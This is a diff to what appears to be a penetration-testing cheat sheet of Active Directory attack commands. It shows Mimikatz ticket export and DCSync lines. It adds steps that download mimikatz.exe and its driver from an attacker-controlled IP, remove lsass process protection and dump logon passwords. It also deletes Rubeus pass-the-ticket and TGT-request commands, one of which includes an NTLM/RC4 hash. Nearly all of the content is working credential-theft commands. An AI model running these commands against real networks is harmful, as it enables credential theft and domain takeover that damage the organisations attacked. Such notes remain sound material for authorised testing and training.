@@ -18,18 +18,26 @@ $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s
 ```
 # Export Kerberos tickets from memory
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::tickets /export"'
+
 # DCSync:
 Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /domain:infinity.com /all"'
+
+# Dump credentials with PPL
+iwr -UseBasicParsing -Uri http://192.168.45.193/Tools/mimikatz.exe -OutFile mimikatz.exe
+iwr -UseBasicParsing -Uri http://192.168.45.193/Tools/mimidrv.sys -OutFile mimidrv.sys
+.\mimikatz.exe
+log
+privilege::debug
+!+
+!processprotect /process:lsass.exe /remove
+sekurlsa::logonpasswords
+exit
 ```
 
 ### Rubeus
 ```
 # Monitor Kerberos tickets on unconstrained delegation machine
 Invoke-Rubeus -Command "monitor /internal:5"
-# Load Kerberos ticket:
-Rubeus.exe ptt /ticket:base64
-# Ask TGT:
-.\Rubeus.exe asktgt /user:administrator /domain:infinity.com /rc4:5f9163ca3b673adfff2828f368ca3760 /ptt
 ```
 
 
